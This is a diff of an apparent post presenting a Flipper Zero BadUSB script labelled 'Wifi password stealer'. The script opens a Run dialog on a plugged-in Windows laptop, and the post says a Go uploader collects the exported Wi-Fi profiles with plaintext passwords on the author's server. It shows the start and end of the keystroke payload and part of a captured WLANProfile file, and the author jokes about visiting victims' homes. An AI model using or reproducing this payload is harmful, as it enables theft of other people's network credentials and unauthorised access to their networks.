@@ -3,8 +3,6 @@ BadUSB flipper script file :
 
 Because getting on your wifi is the start of things. 
 
-
-
 `REM Wifi password stealer
 DELAY 100
 GUI r
@@ -31,16 +29,12 @@ ENTER
 DELAY 1000
 STRING exit
 ENTER`
-----
 
 Run this fun go uploader that saves the files with timestamp
 GoLang because this can be run on any linux box.
 
-
-
 Connect Flipper on laptop-usb Click and GO! (2 seconds?)  
 Below saved file of all found wifi passwords with plaintext passwords on my server, so if you see a bald bearded guy around your house.... beware.
-
 
 flipmeister@server:~/tmp/uploads$ cat 1706822308924902098_flipme.xml  
 `<WLANProfile xmlns="[What's New in Networking | Microsoft Learn](http://www.microsoft.com/networking/WLAN/profile/v1)">
@@ -72,9 +66,3 @@ flipmeister@server:~/tmp/uploads$ cat 1706822308924902098_flipme.xml
  <randomizationSeed>943798801</randomizationSeed>
  </MacRandomization>
 </WLANProfile>`
-
-
-
-
-
-
